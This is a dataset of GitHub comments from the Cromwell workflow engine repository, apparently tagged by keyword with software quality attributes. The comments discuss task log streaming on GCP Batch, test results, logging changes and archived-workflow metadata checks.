https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:759,Testability,log,log,759,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:794,Testability,log,logs,794,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:1025,Testability,log,log,1025,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058:1144,Testability,log,logs,1144,"Unfortunately this approach seems to have some issues:. - The task log is not actually streamed as the WDL task runs. The ""streaming"" appears to happen at the level of GCP Batch runnables. While there is a lot of output in the task log from the runnables preceding the WDL task, there is no output uploaded from the WDL task itself until the task completes.; - The contents of the task log contain log formatting that is not part of the ""raw"" stdout or stderr.; - The contents of the task log also appear to contain GCP Batch agent log output intermingled with the task log output.; - There are extra files being uploaded with names like `stdout-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` and `stderr-job-ab8e9cd9-2dc3-6e005a9d-a38f-441d00-group0-0.log` that appear to be Batch agent logs. In the course of evaluating this I discovered that the `stdout` and `stderr` files actually are being streamed correctly, and furthermore that this is implemented via ""sidecar"" runnables created from Cromwell. Since the task log should conceptually be the interleaved `stdout` and `stderr`, it seems this approach should also work for the task logs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2347314058
https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2353538628:220,Testability,log,logging,220,"Thanks Alex. I just realized today that the approach in my PR does not capture output from any of the setup / localization / delocalization runnables. I'm not sure yet how much this matters, but it may turn out that the logging story isn't completely resolved yet. 🙂",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7529#issuecomment-2353538628
https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724:75,Security,audit,audit,75,"Oh, and the next part of the plan is to delete the buckets to simplify the audit. That's the real purpose here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724
https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724:62,Usability,simpl,simplify,62,"Oh, and the next part of the plan is to delete the buckets to simplify the audit. That's the real purpose here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334841724
https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334857844:68,Testability,test,test,68,"We could, yes. I weighed more heavily the ""would we add this today"" test and absence of evidence that someone wants it. Similar to the Docker Hub healthcheck that is above it in the changelog.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7533#issuecomment-2334857844
https://github.com/broadinstitute/cromwell/pull/7544#issuecomment-2356880121:2,Testability,test,tested,2,"I tested an image built off this branch in my BEE and confirmed that the `vmStartTime` and `vmEndTime` keys were written to metadata, and that the Bard event shows up in the BigQuery table as expected.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7544#issuecomment-2356880121
https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944:152,Testability,test,tests,152,"@aednichols @mcovarr : Please let us know if you have any feedback on this PR. I would like to confirm this is in the right direction before working on tests and getting this ready for merging. Alternatively, please let me know if I should reach out to someone else for review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944
https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944:58,Usability,feedback,feedback,58,"@aednichols @mcovarr : Please let us know if you have any feedback on this PR. I would like to confirm this is in the right direction before working on tests and getting this ready for merging. Alternatively, please let me know if I should reach out to someone else for review.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7545#issuecomment-2357254944
https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259:161,Deployability,deploy,deployments,161,"This remains ready for review, but I haven't been able to do the scale testing I planned because there's a change needed to get the auth to GCP working in Terra deployments. Planning to take care of that and do the scale testing before merging this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259
https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259:71,Testability,test,testing,71,"This remains ready for review, but I haven't been able to do the scale testing I planned because there's a change needed to get the auth to GCP working in Terra deployments. Planning to take care of that and do the scale testing before merging this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259
https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259:221,Testability,test,testing,221,"This remains ready for review, but I haven't been able to do the scale testing I planned because there's a change needed to get the auth to GCP working in Terra deployments. Planning to take care of that and do the scale testing before merging this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7550#issuecomment-2397250259
https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111:35,Availability,failure,failure,35,I believe the patch coverage check failure is due to an incidental fix to the formatting of a log statement.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111
https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111:14,Deployability,patch,patch,14,I believe the patch coverage check failure is due to an incidental fix to the formatting of a log statement.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111
https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111:94,Testability,log,log,94,I believe the patch coverage check failure is due to an incidental fix to the formatting of a log statement.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7555#issuecomment-2376759111
https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738:86,Energy Efficiency,allocate,allocated,86,"Additionally, I really miss the logging 88 eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738
https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738:32,Testability,log,logging,32,"Additionally, I really miss the logging 88 eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738
https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738:168,Testability,log,logging,168,"Additionally, I really miss the logging 88 eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7568#issuecomment-2405624738
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930:317,Deployability,Update,Update,317,"Note:. As it stands, this PR could return false positives for a workflow that has been archived from metadata but still has a summary. I think this is already true for the function converted in https://github.com/broadinstitute/cromwell/pull/4617. I'm not sure whether it's a problem per se, but certainly notable. **Update**: based on the analysis in https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053 the old function `validateWorkflowIdInMetadata` already returns `true` for archived workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930:447,Security,validat,validateWorkflowIdInMetadata,447,"Note:. As it stands, this PR could return false positives for a workflow that has been archived from metadata but still has a summary. I think this is already true for the function converted in https://github.com/broadinstitute/cromwell/pull/4617. I'm not sure whether it's a problem per se, but certainly notable. **Update**: based on the analysis in https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053 the old function `validateWorkflowIdInMetadata` already returns `true` for archived workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2435487930
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:828,Availability,avail,available,828,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:420,Deployability,Canary,CanaryTest,420,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:519,Deployability,canary,canary,519,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:244,Integrability,rout,routes,244,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:637,Integrability,message,message,637,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053:1082,Security,validat,validateWorkflowIdInMetadata,1082,"@salonishah11 it looks like we are already doing an archive status check immediately after the existence check:. https://github.com/broadinstitute/cromwell/blob/6e212299af22c9a3d5cf38d6d518afdcb61ce524/engine/src/main/scala/cromwell/webservice/routes/MetadataRouteSupport.scala#L240-L249. Today on Prod when I open the page for an archived workflow like [this one](https://app.terra.bio/#workspaces/broad-firecloud-dsde/CanaryTest/job_history/61157341-8d2f-4a15-bc6e-e67104c8eab8/63ac4bc1-388c-430d-86f5-d123a7073e3c) (canary workspace) Cromwell responds with the following JSON:. ```; {; ""id"": ""63ac4bc1-388c-430d-86f5-d123a7073e3c"",; ""message"": ""Cromwell has archived this workflow's metadata according to the lifecycle policy. The workflow completed at 2023-08-30T16:39:09.168Z, which was 36384533045 milliseconds ago. It is available in the archive bucket, or via a support request in the case of a managed instance."",; ""metadataArchiveStatus"": ""ArchivedAndDeleted""; }; ```. It comes from `checkIfMetadataDeletedAndRespond` so it seems like the workflow is somehow passing the `validateWorkflowIdInMetadata` existence check despite being archived.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7575#issuecomment-2436191053
